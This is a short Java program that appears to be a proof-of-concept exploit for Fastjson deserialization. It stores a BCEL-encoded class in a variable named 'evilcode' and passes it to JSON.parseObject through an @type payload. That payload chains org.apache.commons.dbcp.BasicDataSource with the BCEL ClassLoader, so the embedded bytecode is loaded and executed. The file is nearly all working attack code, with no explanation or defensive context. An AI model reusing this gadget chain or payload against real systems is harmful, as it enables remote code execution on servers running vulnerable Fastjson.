import com.alibaba.fastjson.*;
import com.alibaba.fastjson.parser.Feature;

public class Main {
    public static void main(String[] args) {
        String evilcode = "$l$8b$I$A$A$A$A$A$A$Am$91$cbO$c2$40$Q$c6$bf$Fd$dbZDP$7c$bf$9f$e0A$$$de0$5e$8c$s$c6$fa$88$Y$8c$c7$b2$ae$b8ZZS$8a$fa$ly$f6$a2F$T$bd$fbG$Zg$abA$Sm$d2$99$ce7$df$fcv$da$7e$7c$be$bc$BXC$d1$82$89$R$L$a3$Y30$ae$f3$E$c7$q$c7$94$854$a69f8f$Z$d2$eb$caW$d1$GC$b2X$aa1$a46$833$c9$90u$94$_$f7$db$cd$ba$M$8f$dd$baGJ$de$J$84$eb$d5$dcP$e9$faGLE$X$aaE$MG$de$u$af$c2$60$ac$L$ef$H$c7$a8$5dp$$$dd$h$b7$ac$82$f2$ce$c1$d6$9d$90$d7$91$K$7c$b2e$aa$91$x$ae$f6$dc$eb$YCK1X$d5$a0$j$K$b9$ad4$d6$d4$b8U$3dk$c3B$_$c7$9c$8dy$y$d0y$b4$82$b0$b1$88$r$86$81$7f$d8$Mc$b1$ea$b9$7e$a3$7c$d4$f6$p$d5$94$9d$a6f$z$TC$c3$Z$fa$7f$8d$H$f5K$v$o$86$dc$9fY$da$ab$n$a3NQ$u$96$9c$3f$9e$8aF$deI$c1$b0$5c$ec$eaV$a3P$f9$8dJ$f7$c0a$Y$I$d9j$d1$c0H$b7$f3$f8$o$Mn$f5$87$a8$94j$98$85A$7fM_$J0$fd$f2$Um$aa$ca$94$Z$e5$9e$95$t$b0$87$b8$9d$a1$98$8e$c5$q$fa$u$da$df$Gd$d1O$d9$40$ae3$7cN$O$dd$h$7eF$o$9f$7cD$ea$e4$k$99$ddW$a4O$89$c6$df$l$e2$a6I$d6$k2j$ec$Q$3di$b8$Z$ab$9c4$834$absL$86$f4$3c$G$a8$g$a4$9b$p$e1p$ULj$M$c5$9b$N$7f$Bg$bf$ba$x$84$C$A$A";
        JSON.parseObject("{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassName\":\"$$BCEL$$"+evilcode+"\",\"driverClassLoader\":{\"@type\":\"org.apache.bcel.util.ClassLoader\"}}");
    }
}